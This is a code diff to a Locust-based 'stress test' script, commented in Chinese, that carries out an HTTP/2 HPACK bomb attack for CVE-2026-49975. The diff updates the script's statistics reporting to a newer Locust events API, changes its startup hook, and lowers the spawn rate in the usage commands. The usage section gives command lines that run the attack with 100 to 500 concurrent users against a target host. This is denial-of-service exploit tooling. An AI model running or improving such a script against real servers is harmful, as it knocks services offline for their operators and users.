@@ -8,11 +8,11 @@ CVE-2026-49975 专用压测脚本
 使用方法：
   # 100 个并发线程，跑 5 分钟
   locust -f locustfile.py --host https://your-target.com \
-    --headless -u 100 -r 100 --run-time 5m
+    --headless -u 100 -r 50 --run-time 5m
 
   # 500 个并发线程，跑 10 分钟
   locust -f locustfile.py --host https://your-target.com \
-    --headless -u 500 -r 500 --run-time 10m
+    --headless -u 500 -r 50 --run-time 10m
 
 环境变量控制：
   LOCUST_REFERENCES    : 每个流的 HPACK 引用次数 (默认 2048)
@@ -136,20 +136,12 @@ class Http2BombUser(User):
     @task
     def http2_bomb_attack(self):
         """
-        执行一次 HTTP/2 HPACK 炸弹攻击，并手动上报统计。
+        执行一次 HTTP/2 HPACK 炸弹攻击。
         """
         hostname, port, use_tls = self._parse_host()
         sock = None
         start_time = time.time()
-        request_meta = {
-            "request_type": "H2-BOMB",
-            "name": f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s)",
-            "start_time": start_time,
-            "response_length": 0,
-            "response": None,
-            "context": {},
-            "exception": None,
-        }
+        exception = None
 
         try:
             # ---- 1. TCP 连接 ----
@@ -182,12 +174,8 @@ class Http2BombUser(User):
                     except OSError:
                         break
 
-            # 成功
-            request_meta["response_length"] = 0
-            request_meta["response"] = None
-
         except Exception as e:
-            request_meta["exception"] = e
+            exception = e
 
         finally:
             if sock:
@@ -198,21 +186,34 @@ class Http2BombUser(User):
 
             # ===== 手动上报请求统计到 Locust =====
             total_time = int((time.time() - start_time) * 1000)
-            request_meta["response_time"] = total_time
+            request_name = f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s)"
 
-            if request_meta["exception"]:
-                # 上报失败
-                events.request_failure.fire(**request_meta)
+            # ===== 关键修复：通过 self.environment.events 访问 =====
+            if exception:
+                self.environment.events.request.fire(
+                    request_type="H2-BOMB",
+                    name=request_name,
+                    response_time=total_time,
+                    response_length=0,
+                    exception=exception,
+                    context={},
+                )
             else:
-                # 上报成功
-                events.request_success.fire(**request_meta)
+                self.environment.events.request.fire(
+                    request_type="H2-BOMB",
+                    name=request_name,
+                    response_time=total_time,
+                    response_length=0,
+                    exception=None,
+                    context={},
+                )
 
 
 # ============================================================
 # 启动时输出配置信息
 # ============================================================
 
-@events.test_start.add_listener
+@events.init.add_listener
 def on_test_start(environment, **kw):
     logger.info("=" * 60)
     logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
